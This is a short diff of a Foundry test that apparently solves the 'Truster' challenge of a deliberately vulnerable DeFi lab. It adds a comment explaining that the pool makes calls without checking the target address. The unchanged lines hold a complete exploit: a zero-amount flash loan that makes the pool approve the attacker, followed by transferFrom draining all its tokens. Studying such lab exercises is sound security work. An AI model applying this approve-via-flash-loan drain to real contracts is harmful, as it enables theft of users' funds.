@@ -43,7 +43,7 @@ contract Truster is Test {
          */
 
         vm.startPrank(attacker);
-        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", attacker, type(uint256).max);
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", attacker, type(uint256).max); // TrusterLenderPool's functionCall didn't check the `target` address correctness.
         trusterLenderPool.flashLoan(0, attacker, address(dvt), data); // borrowAmount and borrower are not important
         dvt.transferFrom(address(trusterLenderPool), attacker, TOKENS_IN_POOL);
         vm.stopPrank();
